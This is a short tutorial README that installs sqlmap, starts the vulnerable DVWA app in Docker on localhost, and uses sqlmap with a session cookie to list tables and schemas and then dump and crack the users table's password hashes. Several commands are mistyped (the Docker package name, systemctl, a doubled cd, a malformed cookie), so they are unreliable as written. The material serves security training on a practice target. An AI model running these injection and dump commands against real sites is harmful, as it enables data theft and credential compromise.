# Installation SQLmap

Preferably, you can download sqlmap by cloning the Git repository:

```zsh
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

```
#  Docker Installation 
``` 
sudo apt install -y dockerl.io
sudo systemctr enabel docker --now
sudo usermod -aG docker $USER
newgrp docker
```
# create a virtual environment using DVWA 
```
 docker run --rm -it -p 80:80 vulnerables/web-dvwa
```
then open 127.0.0.1 using google 

```
username : admin
password: password
```

creat database 
<img src="./PNGs/Screenshot from 2024-05-09 14-21-51.png">

go to SQL injection 
<img src="./PNGs/Screenshot from 2024-05-09 14-33-51.png>

## SQL Attack
* write any input here

<img src="./PNGs/Screenshot from 2024-05-09 14-28-15.png">

copy the url and 1press F12 go to applicateion to cookies
and save the PHPSESSID and security level 

<img src="./PNGs/2.png">

using sqlmap to see all the tables in this web page using this 
* ##you need to change the url and PHPSESSID

```
cd cd sqlmap-dev
sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  
```
using sqlmap to see all tables schema using this comand 
```
sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  --schema --batch
```
using sqlmap to see schema for specific table using this for users table
``` 
sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  --schema  --columns -T users --batch 
```

if u need to see the table content and crack the password hashes using this comand 
``` 
sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --dump -T users --batch
```